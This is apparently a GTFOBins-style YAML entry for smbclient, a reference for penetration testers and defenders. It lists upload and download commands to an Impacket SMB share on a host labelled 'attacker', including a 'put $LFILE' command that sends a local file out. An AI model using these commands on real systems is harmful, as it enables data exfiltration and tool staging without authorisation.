---
description: A valid SMB/CIFS server must be available.
functions:
  file-upload:
    - description: Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to collect the file.
      code: |
        smbclient '\\attacker\share' -c 'put $LFILE'
  file-download:
    - description: Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to send the file.
      code: |
        smbclient '\\attacker\share' -c 'get $RFILE'
---
